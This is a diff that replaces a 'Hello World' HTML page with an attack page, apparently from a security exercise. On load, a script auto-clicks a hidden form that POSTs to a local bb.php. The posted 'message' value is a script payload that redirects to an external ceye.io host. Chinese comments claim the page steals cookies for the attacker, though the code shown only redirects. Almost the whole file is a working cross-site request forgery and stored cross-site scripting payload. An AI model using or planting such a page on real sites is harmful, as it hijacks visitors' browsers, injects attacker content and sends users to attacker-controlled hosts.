@@ -1,12 +1,22 @@
-<!DOCTYPE html>
 <html>
 <head>
-	<title>你好</title>
+<script>
+window.onload = function() {
+  document.getElementById("postsubmit").click();
+}
+</script>
+<!--页面加载后立即执行：点击触发表单提交执行ation跳转指定页面-->
 </head>
 <body>
-<div>
-	<h1><center>Hello World</center></canvas></h1>
-	<h2>D8 713 最六的六学家</h2>
-</div>
+<form style='visibility:hidden' method="post" action="http://127.0.0.1/test/bb.php">
+<!--隐藏表单，指定表单触发action转跳至可信网址-->
+    <input id="xssr_in" type="text" name="message" value=
+    "<script>
+document.location = 'http://z432wk.ceye.io/';
+	</script>"
+	 />
+	 <!--获取cookie并转递给攻击方进行处理-->
+    <input id="postsubmit" type="submit" name="submit" value="submit" />
+</form>
 </body>
 </html>
